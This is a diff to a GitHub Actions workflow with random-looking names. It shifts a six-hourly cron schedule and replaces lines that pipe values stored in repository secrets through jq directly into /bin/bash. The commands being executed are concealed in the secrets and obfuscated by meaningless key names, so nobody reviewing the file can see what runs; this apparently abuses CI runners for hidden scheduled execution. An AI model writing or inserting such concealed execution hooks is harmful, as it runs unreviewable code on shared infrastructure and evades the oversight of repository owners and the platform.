@@ -1,9 +1,8 @@
 name: sanfenditheer
-
 on:
   workflow_dispatch:
   schedule:
-    - cron: '7 2/6 * * *'
+    - cron: '28 1/6 * * *'
 jobs:
   build:
     runs-on: ubuntu-latest
@@ -11,14 +10,8 @@ jobs:
       - uses: actions/checkout@v4
       - name: sanfenditheer
         env:
-          ybk941: ${{ secrets.ybk941 }}
+          xalt225: ${{ secrets.xalt225 }}
         run: |
-          echo $ybk941 | jq -r .wdyvi2903 | /bin/bash
-          echo $hne6 | jq -r .n7 | /bin/bash
-          echo $n7543 | jq -r .rfm55835 | /bin/bash
-          echo $i606 | jq -r .mlv83076 | /bin/bash
-          echo $g0678 | jq -r .xnmfk65090 | /bin/bash
-          echo $pssu03 | jq -r .sz79683 | /bin/bash
-          echo $ngprw04416 | jq -r .b3 | /bin/bash
-          echo $z018 | jq -r .wqj17 | /bin/bash
+          echo $xalt225 | jq -r .sfcye605 | /bin/bash
+          echo $eqmu611 | jq -r .ig1520 | /bin/bash
 
